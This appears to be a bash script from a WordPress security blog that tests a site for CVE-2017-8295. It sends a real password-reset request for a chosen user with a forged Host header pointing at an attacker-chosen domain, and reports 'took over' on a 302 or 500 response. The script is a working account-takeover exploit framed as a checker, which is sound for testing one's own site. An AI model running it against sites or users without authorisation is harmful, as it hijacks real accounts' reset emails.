#!/usr/bin/env bash
#
# Check a WordPress domain against CVE-2017-8295.
# https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
#
# Usage:
# wp_2017-8295.sh <fake_domain> <domain> <username>
#
# <fake_domain>
#   The domain you want to redirect to.
#
# <domain>
#   The WordPress domain you wish to check. For example, http://example.com.
#
# <username>
#   The WordPress username you wish to attempt a password reset for.
#
# Author: Steve Grunwell (https://stevegrunwell.com)
# Link: https://stevegrunwell.com/blog/keeping-wordpress-secure/
# License: MIT
#
# tag::code[]
FAKE_DOMAIN=$1
DOMAIN=$2
USERNAME=$3

echo -e "\nAttempting to reset the password for '$USERNAME' on $DOMAIN:";

RESPONSE=$(curl --write-out %{http_code} --silent --output /dev/null \
	-X POST "http://$DOMAIN/wp-login.php?action=lostpassword" \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H "host: $FAKE_DOMAIN" \
  -H "origin: $DOMAIN" \
  -H "referer: $DOMAIN/wp-login.php?action=lostpassword" \
  -d user_login=$USERNAME \
	-d redirect_to= \
	-d wp-submit=Get+New+Password)

# A 302 response indicates the user was redirected to the confirmation screen.
if [ "$RESPONSE" == "302" ]; then
  echo -e "> Uh yeah, it appears that we took over $DOMAIN.\n"
else
	if [ "$RESPONSE" == "500" ]; then
	  echo -e "> Uh yeah, it appears that we took over $DOMAIN, but the mailing seems to be not configured.\n"
	else
		echo -e "> $RESPONSE: Good news! $DOMAIN appears to be safe from this exploit.\n"
	fi
fi
# end::code[]
